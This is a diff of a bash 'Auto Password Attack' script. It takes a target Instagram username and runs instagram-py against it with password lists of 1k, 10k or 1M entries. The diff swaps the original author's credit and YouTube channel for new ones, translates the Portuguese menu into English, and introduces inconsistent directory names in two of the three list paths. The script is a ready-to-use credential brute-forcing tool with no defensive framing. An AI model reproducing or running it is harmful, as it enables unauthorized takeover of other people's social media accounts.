@@ -17,33 +17,33 @@ echo '
                 [#] Auto Password Attack [#]
 ' |lolcat
 printf "\n"
-printf "                \e[101m\e[1;77m  >>  Script By gilmar filho << \e[0m\n"
+printf "                \e[101m\e[1;77m  >>  Script By N17R0 << \e[0m\n"
 printf "\n"
-printf "       \e[100m\e[1;77m >>  meu canal no Youtube : \e[1;96m Força Bruta \e[100m\e[1;77m << \e[0m\n"
+printf "       \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m Noob Hackers \e[100m\e[1;77m << \e[0m\n"
 printf "\n"
 echo
 read -p "[#] User Name : " usrnm
 echo
-echo -e "$grn              [+]$red Type$ylo 1$blue PARA 1k senhas$grn
-              [+]$red Type$ylo 2$red PARA 10K senhas$grn
-              [+]$red Type$ylo 3$red PARA 1M senha$rset"
+echo -e "$grn              [+]$red Type$ylo 1$red FOR 1k Passwords$grn
+              [+]$red Type$ylo 2$red FOR 10K Passwords$grn
+              [+]$red Type$ylo 3$red FOR 1M Passwords $rset"
 echo
 read -p "[#] Enter Selected Number: " marks
 echo 
 if [ $marks = 1 ]
 then
-    instagram-py --username $usrnm --password-list $HOME/ighackinstagram/pass/pass1.txt 
+    instagram-py --username $usrnm --password-list $HOME/ghackinstagram/pass/pass1.txt 
  
 elif [ $marks = 2 ]
 then
-    instagram-py --username $usrnm --password-list $HOME/ighackinstagram/pass/pass2.txt
+    instagram-py --username $usrnm --password-list $HOME/ghackinstagram/pass/pass2.txt
  
 elif [ $marks = 3 ]
 then
     instagram-py --username $usrnm --password-list $HOME/ighackinstagram/pass/pass3.txt
 else
 echo
-echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"
+echo -e  "$ylo >>> exiting........! Thau Thau :) <<<$rset"
 echo
 sleep 1.0
 cd $HOME
